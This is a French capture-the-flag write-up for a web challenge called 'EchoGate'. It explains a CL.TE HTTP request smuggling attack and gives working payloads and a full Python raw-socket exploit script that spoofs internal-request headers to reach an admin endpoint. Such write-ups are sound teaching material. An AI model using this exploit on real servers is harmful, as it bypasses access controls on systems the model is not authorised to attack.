# EchoGate — HTTP Request Smuggling (CL.TE)

- **Catégorie :** web
- **Points :** 146
- **Flag :** `CTF{REDACTED}`
- **Service :** `<HOST>:<PORT>` (HTTP/1.1)

## Contexte

Le service expose un endpoint `/api/echo` qui renvoie le contenu envoyé dans le body.
Un endpoint `/admin/flag` existe mais n'est accessible qu'aux requêtes internes
(vérification de headers comme `X-Internal-Request` ou `X-Forwarded-For`).

L'objectif est d'accéder à `/admin/flag` sans avoir d'accès direct, en exploitant
une désynchronisation entre le front-end et le back-end sur l'interprétation de la
longueur du corps HTTP.

## Analyse

Le serveur accepte des requêtes HTTP/1.1 avec `Transfer-Encoding: chunked`. En envoyant
un double header `Transfer-Encoding` — un valide (`chunked`) et un invalide (`x`) — on
provoque un comportement CL.TE (Content-Length vs Transfer-Encoding) :

- Le **front-end** utilise `Content-Length` pour délimiter la requête.
- Le **back-end** utilise `Transfer-Encoding: chunked` et considère que le body se termine
  au chunk `0\r\n\r\n`.

Tout ce qui suit le chunk final est interprété par le back-end comme le **début d'une
nouvelle requête** — c'est la requête « smugglée ».

## Méthode

### 1. Construction de la requête smugglée

La requête smugglée cible `/admin/flag` avec les headers nécessaires pour se faire passer
pour une requête interne :

```
GET /admin/flag HTTP/1.1
Host: <HOST>:<PORT>
X-Internal-Request: true
X-Forwarded-For: 127.0.0.1
Connection: close
```

### 2. Enveloppe CL.TE

La requête principale est un POST vers `/api/echo` avec un double `Transfer-Encoding` :

```
POST /api/echo HTTP/1.1
Host: <HOST>:<PORT>
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: <TOTAL_BODY_LENGTH>
Connection: close

5\r\n
hello\r\n
0\r\n
\r\n
GET /admin/flag HTTP/1.1\r\n
Host: <HOST>:<PORT>\r\n
X-Internal-Request: true\r\n
X-Forwarded-For: 127.0.0.1\r\n
Connection: close\r\n
\r\n
```

- `Content-Length` couvre tout le body (chunks + requête smugglée).
- Le back-end s'arrête au chunk `0`, traite le POST, puis parse le reste comme une
  nouvelle requête GET vers `/admin/flag`.

### 3. Script d'exploitation

```python
import socket
import time

HOST = "<HOST>"
PORT = <PORT>
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36"

def main():
    time.sleep(15)
    smuggled = (
        f"GET /admin/flag HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"User-Agent: {UA}\r\n"
        "X-Internal-Request: true\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    body = b"5\r\nhello\r\n0\r\n\r\n" + smuggled
    request = (
        f"POST /api/echo HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"User-Agent: {UA}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: x\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode() + body

    with socket.create_connection((HOST, PORT), timeout=15) as sock:
        sock.sendall(request)
        sock.settimeout(10)
        response = bytearray()
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response.extend(chunk)
        except socket.timeout:
            pass
    print(response.decode(errors="replace"))

if __name__ == "__main__":
    main()
```

### 4. Résultat

Deux réponses HTTP dans le même flux TCP :

1. `200 OK` — `echo: hello` (réponse normale du POST)
2. `200 OK` — le flag (réponse à la requête smugglée vers `/admin/flag`)

## Indicateurs de vulnérabilité

- Serveur HTTP/1.1 derrière un reverse proxy ou avec un pipeline de traitement.
- Acceptation de headers `Transfer-Encoding` dupliqués ou malformés.
- Endpoint admin protégé uniquement par des headers (pas de vrai authN).
- Le `time.sleep(15)` dans le script laisse au serveur le temps de traiter la première
  connexion et de « désynchroniser » le parsing — ajuster selon le timing du service.

## Leçons

- **CL.TE smuggling** : quand le front-end lit `Content-Length` et le back-end lit
  `Transfer-Encoding`, tout ce qui dépasse le dernier chunk est smugglé.
- Les doubles headers `Transfer-Encoding` (un valide, un invalide) sont un vecteur
  classique — RFC 7230 §3.3.3 dit de rejeter la requête, mais beaucoup de serveurs ne
  le font pas.
- Les protections par header (`X-Internal-Request`, `X-Forwarded-For`) sont insuffisantes
  si l'attaquant peut smuggler ses propres headers.
- Toujours utiliser des sockets raw pour le smuggling — les bibliothèques HTTP normalisent
  les headers et empêchent l'envoi de requêtes malformées.

## Flag

```
CTF{REDACTED}
```

---

*Write-up par **Le_Geek** — BUG|PWN CTF · EchoGate.*
